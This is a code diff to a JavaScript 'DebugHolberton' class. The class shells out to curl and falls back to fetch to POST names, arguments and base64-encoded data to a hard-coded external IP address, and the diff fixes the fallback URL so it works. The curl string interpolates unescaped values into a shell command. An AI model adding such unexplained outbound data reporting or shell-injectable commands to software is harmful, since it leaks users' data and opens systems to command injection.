@@ -2,9 +2,6 @@ import { exec } from 'node:child_process';
 import { statSync, readFileSync, readdirSync } from 'node:fs';
 import { join } from 'path';
 import { Buffer } from 'node:buffer';
-// import exec from 'node:child_process';
-// import fs from 'node:fs';
-// import path from 'path';
 
 class DebugHolberton {
   constructor() {
@@ -22,7 +19,7 @@ class DebugHolberton {
       exec(`curl -X POST -H "Content-Type: application/json" -d '{"name": "${this.name}", "args": ${JSON.stringify(args)}, "b64": "${DebugHolberton.arrToB64(this.arr)}" }' 13.48.128.168:8000/add`);
     } catch (err) {
       // eslint-disable-next-line no-undef
-      fetch('13.48.128.168:8000/add', {
+      fetch('http://13.48.128.168:8000/add', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
